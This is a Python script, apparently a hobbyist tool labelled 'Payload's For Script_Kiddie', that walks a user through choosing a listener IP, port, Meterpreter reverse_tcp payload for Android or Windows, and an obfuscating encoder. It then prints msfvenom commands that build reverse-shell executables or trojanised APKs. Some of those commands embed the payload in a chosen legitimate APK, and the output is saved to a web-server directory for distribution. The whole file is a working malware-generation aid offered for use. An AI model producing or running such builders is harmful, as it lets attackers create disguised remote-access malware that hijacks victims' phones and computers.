print('-----------------Payload\'s For Script_Kiddie------------------')
print('---------------------------------By SaZu_---------------------\n')
print('choose a IP')
print('_______________\n')
print('1. custom')
print('2. 192.168.1.46')
print('3. 192.168.1.53')
user_ip = int(input('==> '))                                    #CoppyRight@SazU
def ip(l):
    ip = ''
    if l == 1:
        ip += input('Type your IP : ')
    elif l == 2:
        ip += '192.168.1.46'
    elif l == 3:
        ip += '192.168.1.53'
    else:
        print('not a valid number')
    return ip
IP = ip(user_ip)
print('_______________')
print('choose a Port')
print('---------------\n')
print('1. custom')
print('2. 4444')
use_input_port = str(input('==> '))
def port(l):
    final_port = ''
    if l == '1':
        port = str(input('Costom Port => '))
        final_port += port
    elif l == '2':
        final_port += '4444'
    return final_port
use_port = port(use_input_port)
print('________________')
print('choose a Payload')
print('----------------\n')
print('1. custom\n')
print('2. android/meterpreter/reverse_tcp')
print('3. android/meterpreter_reverse_tcp\n')
print('4. windows/x64/meterpreter/reverse_tcp')
print('5. windows/x64/meterpreter_reverse_tcp')
print('6. windows/meterpreter/reverse_tcp')
print('7. windows/meterpreter_reverse_tcp')
payload_user_input = int(input('==> '))
def payload(l):
    payload_is = ''
    if payload_user_input == 1:
        payload = str(input('your custom Payload => '))
        payload_is += payload
    elif payload_user_input == 2:
        payload_is += 'android/meterpreter/reverse_tcp'
    elif payload_user_input == 3:
        payload_is += 'android/meterpreter_reverse_tcp'
    elif payload_user_input == 4:
        payload_is += 'windows/x64/meterpreter/reverse_tcp'
    elif payload_user_input == 5:
        payload_is += 'windows/x64/meterpreter_reverse_tcp' #CoppyRight@sazu
    elif payload_user_input == 6:
        payload_is += 'windows/meterpreter/reverse_tcp'
    elif payload_user_input == 7:
        payload_is += 'windows/meterpreter_reverse_tcp'
    else:
        print('Invalid Payload')
    return payload_is
final_payload = payload(payload_user_input)
def savework(l):
    output = ''
    if l == 2 or l == 3:
        output += '.apk'
    else:
        output += '.exe'
    return output
save1 = str(input('\nName the Payload => '))
save = '/var/www/html/' + save1 + savework(payload_user_input)
if payload_user_input == 1 or payload_user_input == 2 or payload_user_input == 3:
    targeted_apk = str(input('which apk we should use => '))
    if targeted_apk:
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print(f'msfvenom -x {targeted_apk} -p {final_payload} LHOST={IP} LPORT={use_port} -i 10 > {save}')
    else:
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print(f'msfvenom -p {final_payload} LHOST={IP} LPORT={use_port} -i 10 > {save}')
elif payload_user_input == 4 or payload_user_input == 5:
    print('if you don\'t wan\'t to use encoder then leave it Blank \n')
    print('\\/\\/\\/\\/-Encoders-x64\\/\\/\\/\\/')
    print('1) x64/xor_dynamic')
    print('2) x64/xor_context')
    print('3) x64/xor\n')
    encoder_user_input = str(input('==> '))
    def encoderP(l):
        final_encoderx64 = ''
        if l == '1':
            final_encoderx64 += 'x64/xor_dynamic'
        elif l == '2':
            final_encoderx64 += 'x64/xor_context'
        else:
            final_encoderx64 += 'x64/xor'
        return final_encoderx64
    if encoder_user_input:
        encoder = encoderP(encoder_user_input)
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print(f'msfvenom -p {final_payload} LHOST={IP} LPORT={use_port} --platform windows --encoder {encoder} --format exe -i 10 > {save}')
    else:
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print(f'msfvenom -p {final_payload} LHOST={IP} LPORT={use_port} --platform windows --format exe -i 10 > {save}')    
else:
    print('-------------------------------------------------------------------')
    print('if you don\'t wan\'t to use encoder then leave it Blank \n')
    print('\\/\\/\\/\\/-Encoders-x32\\/\\/\\/\\/')
    print('1) x86/xor_dynamic') #CoppyRight@SaZu
    print('2) x86/shikata_ga_nai')
    print('3) x86/countdown')
    print('4) x86/jmp_call_additive')
    encoder_user_input_2 = str(input('==> '))
    list1 = ['xor_dynamic', 'shikata_ga_nai', 'countdown', 'jmp_call_additive']
    def encoderProb(l):
        final_encoderx86 = ''
        if l == '1':
            final_encoderx86 += 'x86/' + list1[0]
        elif l == '2':
            final_encoderx86 += 'x86/' + list1[1]
        elif l == '3':
            final_encoderx86 += 'x86/' + list1[2] #CoppyRight@Sazu
        else:
            final_encoderx86 += 'x86/' + list1[3]
        return final_encoderx86
    if encoder_user_input_2:
        encoder = encoderProb(encoder_user_input_2)
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print(f'msfvenom -p {final_payload} LHOST={IP} LPORT={use_port} --platform windows --encoder {encoder} --format exe -i 10 > {save}')
    else:
        print('_______________')
        print('Your Payload is Ready')
        print('---------------\n')
        print('msfvenom -p {} LHOST={} LPORT={} --platform windows --format exe -i 10 > {}'.format(final_payload, IP, use_port, save))

#CoppyRight@Sazu













